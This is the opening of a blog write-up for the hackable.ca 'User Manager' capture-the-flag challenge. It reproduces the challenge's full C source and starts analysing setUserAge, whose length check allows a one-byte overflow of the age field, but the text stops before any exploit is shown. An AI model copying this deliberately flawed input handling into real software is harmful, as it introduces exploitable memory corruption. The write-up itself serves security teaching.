
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="author" content="F3real" />
        <meta name="keywords" content="ctf,pwnable,binary exploitation" />
        <meta name="description" content="How to solve hackable.ca User Manager" />


    <title>Hackable.ca User Manager - EnSec blog</title>

    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />

    <!-- Feeds -->
</head>
<body data-spy="scroll" data-target="#scrollspy">
    <div id="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar-wrapper-small" class="twitchy-background">
            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
                <li>
        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
            <span class="fas fa-home"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
            <span class="fas fa-th-list"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
                        <i class="fas fa-users padding-small"></i>
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
                    </li>
                </ul></li>
                <li class="nav-divider"></li>
                <li>
        <a href="#" title="Back to top" class="collapsed">
            <span class="fas fa-arrow-up"></span>
        </a>
    </li>
            </ul>
        </nav>
        <nav id="sidebar-wrapper" class="twitchy-background">
            <ul id="accordion" class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="https://f3real.github.io/">
                            <span class="fas fa-home padding-small"></span>
                            EnSec blog
                    </a>
                </li>
                    <li>
                        <a href="https://f3real.github.io/archives.html">
                            <span class="fas fa-th-list padding-small"></span>
                            Archives
                        </a>
                    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
                        <i class="fas fa-users padding-small"></i>
                        Contact
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github">
                            <i class="fab fa-github-square padding-small"></i>
                            Github
                        </a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
                            <i class="fab fa-linkedin padding-small"></i>
                            Linkedin
                        </a>
                    </li>
                </ul></li>
                
                <li class="nav-divider"></li>
                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
                </ul></li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
                        <i class="fas fa-folder-open padding-small"></i>
                        Categories
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
                    <li class="active">
                        <a href="https://f3real.github.io/category/ctf.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            ctf
                            <span class="badge badge-secondary float-right categorybadge">28</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/misc.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            misc
                            <span class="badge badge-secondary float-right categorybadge">15</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/reversing.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            reversing
                            <span class="badge badge-secondary float-right categorybadge">6</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/tutorial.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            tutorial
                            <span class="badge badge-secondary float-right categorybadge">5</span>
                        </a>
                    </li>
                </ul></li>
            </ul>
        </nav>
        <!-- /#sidebar-wrapper -->
        <!-- open/close sidebar -->
        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
        </button>
       <!-- /open/close sidebar -->

        <!-- Page Content -->
        <div id="page-content-wrapper">
            <div class="container-fluid">
<section id="content">
    <article>
        <div class="row">
            <div class="col-lg-10">
                <header class="page-header">
                    <h1>
                        <a href="https://f3real.github.io/hackable_ca_userManager.html"
                           rel="bookmark"
                           title="Permalink to Hackable.ca User Manager">
                            Hackable.ca User Manager
                        </a>
                        <small>
<div class="post-info">
    <div class="publish-info-block">
        <small>
            <span class="published">
                <i class="fa fa-calendar padding-small"></i><time datetime="2018-08-03T10:02:00+02:00"> Fri 03 August 2018</time>
            </span>
            <span class="category">
                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
            </span>
            <span class="tags">
                <i class="fa fa-tags padding-small"></i>
                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/pwnable.html">pwnable</a> /                 <a href="https://f3real.github.io/tag/binary-exploitation.html">binary exploitation</a>            </span>
        </small>
    </div>
</div><!-- /.post-info -->                        </small>
                    </h1>
                </header>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-10">
                <div class="entry-content">
                    <p>Today we take a look at another interesting challenge from <a href="www.hackable.ca">hackable.ca</a>. Like usual we are given source code and binary. So let’s look at source first:</p>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>

<span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">mainMenuText</span><span class="w"> </span><span class="o">=</span>
<span class="w">    </span><span class="s">&quot;     MAIN MENU      </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;--------------------</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;1 - view user       </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;2 - create user     </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;3 - exit            </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&gt; &quot;</span><span class="p">;</span>

<span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">userMenuText</span><span class="w"> </span><span class="o">=</span>
<span class="w">    </span><span class="s">&quot;--------------------</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;1 - change username </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;2 - change email    </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;3 - change age      </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;4 - change password </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;5 - RETURN          </span><span class="se">\n</span><span class="s">&quot;</span>
<span class="w">    </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&gt; &quot;</span><span class="p">;</span>

<span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">user</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">email</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">password</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">age</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span><span class="w"> </span><span class="n">user</span><span class="p">;</span>

<span class="kt">int</span><span class="w"> </span><span class="n">current_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="n">user</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="kt">int</span><span class="w"> </span><span class="n">first_empty_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">userInputLine</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">inputBuf</span><span class="p">[],</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">parameter</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n</span><span class="s">%s&gt; &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">parameter</span><span class="p">);</span>
<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="w">    </span><span class="n">inputBuf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot; %255[^</span><span class="se">\n</span><span class="s">]&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">inputBuf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">viewUser</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;name of user&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">first_empty_user</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">            </span><span class="n">current_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">id</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">current_user</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;No user by that name&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">setUserName</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="p">);</span>

<span class="w">    </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;set usernme&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">inputLine</span><span class="p">);</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">setUserEmail</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="p">);</span>

<span class="w">    </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;set email&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">inputLine</span><span class="p">);</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">setUserAge</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">maxage</span><span class="p">;</span>
<span class="w">    </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;set age&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">maxage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">age</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">inputLine</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">maxage</span><span class="p">)</span>
<span class="w">        </span><span class="n">inputLine</span><span class="p">[</span><span class="n">maxage</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">age</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">setUserPassword</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="p">);</span>

<span class="w">    </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;set password&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">inputLine</span><span class="p">);</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">displayUserInfo</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;username: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;   email: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;     age: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">age</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;password: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">createSystemAccount</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">first_empty_user</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">newID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">first_empty_user</span><span class="o">++</span><span class="p">;</span>

<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">newID</span><span class="p">].</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newID</span><span class="p">;</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">newID</span><span class="p">].</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;admin_account_-_unknown_name&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">newID</span><span class="p">].</span><span class="n">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;root@localhost&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">users</span><span class="p">[</span><span class="n">newID</span><span class="p">].</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;flag{REMOVED_FROM_THIS_VERSION}&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">newID</span><span class="p">].</span><span class="n">age</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;99&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">createSystemAccount</span><span class="p">())</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">menuOption</span><span class="p">;</span>

<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n\n\n\n</span><span class="s">================================&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">current_user</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mainMenuText</span><span class="p">);</span>
<span class="w">            </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="w">            </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">menuOption</span><span class="p">);</span>
<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">menuOption</span><span class="p">)</span>
<span class="w">            </span><span class="p">{</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">                </span><span class="n">viewUser</span><span class="p">();</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">first_empty_user</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">31</span><span class="p">)</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;sorry, too many users&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">else</span>
<span class="w">                </span><span class="p">{</span>
<span class="w">                    </span><span class="n">current_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">first_empty_user</span><span class="o">++</span><span class="p">;</span>
<span class="w">                    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current_user</span><span class="p">;</span>
<span class="w">                    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">                    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">                    </span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
<span class="w">                    </span><span class="n">setUserName</span><span class="p">();</span>
<span class="w">                    </span><span class="n">setUserEmail</span><span class="p">();</span>
<span class="w">                    </span><span class="n">setUserAge</span><span class="p">();</span>
<span class="w">                    </span><span class="n">setUserPassword</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="n">displayUserInfo</span><span class="p">();</span>
<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">userMenuText</span><span class="p">);</span>
<span class="w">            </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="w">            </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">menuOption</span><span class="p">);</span>
<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">menuOption</span><span class="p">)</span>
<span class="w">            </span><span class="p">{</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
<span class="w">                </span><span class="n">setUserName</span><span class="p">();</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
<span class="w">                </span><span class="n">setUserEmail</span><span class="p">();</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
<span class="w">                </span><span class="n">setUserAge</span><span class="p">();</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span>
<span class="w">                </span><span class="n">setUserPassword</span><span class="p">();</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
<span class="w">                </span><span class="n">current_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>At first look there are no obvious bugs, no obvious buffer overflows or format string exploits. Looking through code I noticed that only function that stands out is <code>setUserAge</code> since it doesn’t allocate memory dynamically and it does different checks. So let's examine it more carefully:</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">setUserAge</span><span class="p">()</span><span class="w"> </span>
<span class="w">    </span><span class="p">{</span><span class="w">                          </span>
<span class="w">     </span><span class="kt">char</span><span class="w"> </span><span class="n">inputLine</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="w">                        </span>
<span class="w">     </span><span class="kt">size_t</span><span class="w"> </span><span class="n">maxage</span><span class="p">;</span><span class="w">                        </span>
<span class="w">     </span><span class="n">userInputLine</span><span class="p">(</span><span class="n">inputLine</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;set age&quot;</span><span class="p">);</span>
<span class="w">     </span><span class="n">maxage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">age</span><span class="p">);</span>
<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">inputLine</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">maxage</span><span class="p">)</span><span class="w">                               </span>
<span class="w">         </span><span class="n">inputLine</span><span class="p">[</span><span class="n">maxage</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                                                   </span>
<span class="w">     </span><span class="n">strcpy</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">current_user</span><span class="p">].</span><span class="n">age</span><span class="p">,</span><span class="w"> </span><span class="n">inputLine</span><span class="p">);</span><span class="w">                       </span>
<span class="w">    </span><span class="p">}</span>
</code></pre></div>

